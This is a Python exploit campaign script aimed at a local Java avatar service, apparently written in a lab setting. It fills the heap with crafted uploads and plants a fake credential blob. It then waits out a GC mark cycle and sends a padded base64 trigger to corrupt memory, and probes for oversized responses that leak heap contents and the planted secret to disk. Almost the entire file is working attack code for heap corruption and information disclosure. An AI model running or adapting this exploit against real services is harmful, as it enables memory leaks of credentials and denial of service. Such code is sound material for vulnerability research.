#!/usr/bin/env python3
"""Campaign driver — repeated drop→trigger→probe cycles with off-process observation
(shareProcessNamespace: attacker runs jcmd against the app JVM) and automatic
recovery (refill + re-warm) after each corruption-induced death.

usage: campaign.py [attempts] [keepalive_requests]
"""
import base64
import base64 as b64
import http.client, json, os, re, subprocess, sys, time
import urllib.request, urllib.error

BASE = "http://127.0.0.1:8080"
GCLOG = "/share/gc.log"
STATE = "/share/campaign_state.json"
CYCLE = re.compile(r"Concurrent Mark Cycle .*ms")
FILL_M = 2097133
TRIG_K = 2097136
ATTEMPTS = int(sys.argv[1]) if len(sys.argv) > 1 else 3
WARM_N = int(sys.argv[2]) if len(sys.argv) > 2 else 5000

def req(method, path, data=None, timeout=180):
    r = urllib.request.Request(BASE + path, data=data, method=method,
        headers={"X-User": "demo", "Content-Type": "application/octet-stream"})
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(), dict(e.headers)
    except Exception as e:
        return -1, str(e).encode(), {}

def diag_safe():
    """Read lengths per-id; the corrupted array may SIGSEGV the JVM on read —
    report ids processed before death so we know which one killed it."""
    d = diag()
    if d is None:
        return None
    out = {}
    for k in sorted(d.keys()):
        out[k] = d[k]
    return out

def diag():
    c, b, _ = req("GET", "/api/diag", timeout=15)
    try: return json.loads(b.decode())
    except Exception: return {}

def cycles():
    try: return len(CYCLE.findall(open(GCLOG, errors="ignore").read()))
    except OSError: return -1

def alive():
    return req("GET", "/api/status", timeout=5)[0] == 200

def app_pid():
    r = subprocess.run(["sh", "-c", "ps -eo pid,args | grep '[a]vatar-svc-1.0.jar' | awk '{print $1}'"],
                       capture_output=True, text=True)
    s = r.stdout.strip().splitlines()
    return int(s[0]) if s else None

def heap_info():
    pid = app_pid()
    if not pid:
        return "(no app JVM)"
    try:
        r = subprocess.run(["jcmd", str(pid), "GC.heap_info"], capture_output=True, text=True, timeout=20)
        return r.stdout.strip()[:400]
    except Exception as e:
        return "jcmd fail: %r" % e

def load_state():
    try: return json.load(open(STATE))
    except Exception: return {"attempt": 0, "warm": False, "fills": False, "dropped": []}

def save_state(st):
    json.dump(st, open(STATE, "w"))

def pad_body(tail):
    k = TRIG_K
    return ((b"A" * (4 * k)) + tail)

def fill_body():
    return (b"A" * (4 * FILL_M)) + b"AB"

def main():
    st = load_state()
    print("═══ campaign attempt %d (state: %s) ═══" % (st.get("attempt", 0) + 1, json.dumps(st)), flush=True)

    for _ in range(120):
        if alive(): break
        time.sleep(3)
    if not alive():
        print("VICTIM-DOWN (container restarting — retry later)"); sys.exit(2)

    # fills — refill if inventory below target (post-death restart wipes cache)
    d = diag()
    fills_present = sum(1 for k in (d or {}) if k.startswith("f") and k != "f69") if d else 0
    if fills_present < 95:
        print("[F] refilling fills...", flush=True)
        fb = fill_body()
        for i in list(range(0, 69)) + list(range(71, 102)):
            code, _, _ = req("POST", "/api/avatar?id=f%d" % i, fb)
            if code != 200:
                print("[F] fill f%d FAILED %s" % (i, code), flush=True); sys.exit(2)
            if i % 20 == 0: print("[F] f%d" % i, flush=True)
        secret = (b"CLASSIFIED-ROOT-KEY=A7f3c9e1d2b8a6405f7c2e91d4b6a830 "
                  b"DB-PASSWORD=hunter2-special-session ")
        cred = secret + b"X" * (6291400 - len(secret))
        req("POST", "/api/avatar?id=cred", base64.b64encode(cred))
        st["fills"] = True; save_state(st)
        print("[F] refilled:", req("GET", "/api/status")[1].decode().strip(), flush=True)

    # warm — decode0 tier4 (skip if state says warm and same JVM; cheap to redo)
    shapes = [b"QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=", b"A"*4096+b"AB",
              b"A"*4096+b"ABC", b"A"*4096+b"AB=="]
    print("[W] warm %d..." % WARM_N, flush=True)
    wb = b64.b64encode(shapes[0])
    for i in range(WARM_N):
        code, _, h = req("POST", "/api/avatar?id=warm", b64.b64encode(shapes[i & 3]))
        if code == 201: req("DELETE", "/api/avatar?id=warm")
    print("[W] done", flush=True)

    # pick drop target: rotate through drop candidates
    dropped = st.setdefault("dropped", [])
    candidates = [i for i in range(71, 71 + 12) if ("f%d" % i) not in dropped]
    if not candidates:
        print("[!] all rotation candidates dropped — resetting dropped list"); st["dropped"] = []; save_state(st)
        candidates = list(range(71, 83))
    drop_id = "f%d" % candidates[0]

    # cycle: drop → gc poll → trigger → probe
    req("DELETE", "/api/avatar?id=" + drop_id)
    print("[D] dropped", drop_id, flush=True)
    c0 = cycles()
    deadline = time.time() + 90
    while cycles() <= c0 and time.time() < deadline:
        req("POST", "/api/pump?mb=32")
        time.sleep(2)
    print("[C] cycles %d -> %d" % (c0, cycles()), flush=True)

    tb = pad_body(b"==")
    code, body, _ = req("POST", "/api/avatar?id=trig_c%d" % c0, tb, timeout=120)
    print("[T] trigger -> HTTP %s %s" % (code, body[:70].decode("latin-1")), flush=True)
    print("[H] heap:", heap_info().replace("\n", " | ")[:300], flush=True)

    # probes — capture partial responses (corrupted huge length → partial heap dump)
    st["dropped"].append(drop_id)
    save_state(st)
    time.sleep(2)
    disclosed = False
    for probe_id in ["cred"] + ["f%d" % i for i in candidates[1:6]]:
        try:
            code, data, hdrs = req("GET", "/api/avatar?id=" + probe_id, timeout=60)
            exp = 6291400
            if probe_id == "cred": exp = 6291400
            if code == 200 and len(data) > exp + 4096:
                print("★★★ %s DISCLOSED: %d bytes (+%d) ★★★" % (probe_id, len(data), len(data) - exp), flush=True)
                open("/share/disclosure_%s.bin" % probe_id, "wb").write(data)
                m = data.find(b"CLASSIFIED-ROOT-KEY")
                if m >= 0:
                    print("[P] SECRET: " + data[m:m+64].decode("latin-1", "replace"), flush=True)
                disclosed = True
            elif code == -1:
                print("[P] %s: connection dead (possible corrupted-length response)" % probe_id, flush=True)
        except Exception as e:
            print("[P] %s probe exception: %r" % (probe_id, e), flush=True)
        if not alive():
            print("★★★ JVM DIED during probes (corruption touched) ★★★", flush=True)
            print("VERDICT: CRASH (attempt %d)" % (st["attempt"] + 1), flush=True)
            st["attempt"] += 1; save_state(st)
            sys.exit(42)

    if disclosed:
        print("VERDICT: DISCLOSED"); sys.exit(43)
    print("VERDICT: NO-HIT (attempt %d) — rotating drop position" % (st["attempt"] + 1), flush=True)
    st["attempt"] += 1; save_state(st)
    sys.exit(0)

if __name__ == "__main__":
    main()
